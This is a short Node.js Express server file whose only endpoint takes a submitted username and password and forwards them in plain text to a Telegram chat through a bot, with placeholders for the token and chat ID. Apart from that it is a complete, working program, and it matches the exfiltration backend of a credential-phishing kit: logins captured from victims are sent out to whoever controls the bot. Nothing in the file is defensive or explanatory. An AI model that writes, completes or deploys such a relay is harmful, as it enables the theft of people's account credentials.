const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

app.post('/send-message', async (req, res) => {
  const { username, password } = req.body;

  const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
  const CHAT_ID = 'YOUR_CHAT_ID';
  const message = `Username: ${username}\nPassword: ${password}`;

  try {
    const response = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: CHAT_ID,
        text: message,
      }
    );

    if (response.data.ok) {
      res.status(200).send('Message sent successfully');
    } else {
      res.status(500).send('Error sending message');
    }
  } catch (error) {
    res.status(500).send('Error sending message');
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
